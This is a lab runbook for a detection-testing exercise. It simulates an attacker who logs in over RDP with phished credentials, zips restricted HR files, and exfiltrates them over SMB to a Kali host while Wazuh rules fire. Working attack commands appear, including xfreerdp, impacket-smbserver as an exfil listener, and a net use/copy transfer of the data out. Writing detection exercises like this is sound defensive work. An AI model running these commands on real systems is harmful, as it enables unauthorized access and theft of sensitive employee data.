# Scenario 2 — Simulation Commands (verified, 19 Aug 2026 live run)

Attacker machine: Kali (`192.168.100.20`). Target: Employee-Normal (`192.168.100.10`).

Note: the original attack narrative includes a credential-phishing step
(a fake HR login page) before this. That step was **deliberately not
built or simulated** — the scenario proceeds from "assume credentials
were already phished," starting at the RDP step below.

### 1. Remote access via stolen credentials
```
xfreerdp /v:192.168.100.10 /u:"Shjoon Almutairi" /p:<redacted> /cert:ignore
```

### 2. Stage the sensitive data (run inside the RDP session)
```
Compress-Archive -Path "C:\Corporate_Shares\HR_Department\02_Restricted_Executive_HR\*" -DestinationPath "C:\Corporate_Shares\HR_Department\02_Restricted_Executive_HR\staged_data.zip"
```

### 3. Stand up the exfil listener (on Kali)
```
sudo impacket-smbserver exfil /home/kali/exfil -smb2support -username kali -password kali123
```

### 4. Connect and exfiltrate (run inside the RDP session)
```
net use \\192.168.100.20\exfil /user:kali kali123
cmd /c "copy C:\Corporate_Shares\HR_Department\02_Restricted_Executive_HR\staged_data.zip \\192.168.100.20\exfil\staged_data.zip"
```

### Expected dashboard evidence, in order
1. Rule **100026** — RDP logon from the attacker IP
2. Wazuh FIM — `staged_data.zip` added, then checksum-changed as it's written
3. Rule **100028** — outbound SMB connection permitted to `192.168.100.20:445`
4. Rule **100027** — explicit-credential logon as `kali` (fires ~3ms after 100028 — connection opens before authentication, correct SMB order)

Passwords shown as `<redacted>` here — real values are in the team's
private setup notes, not this public-facing repo.
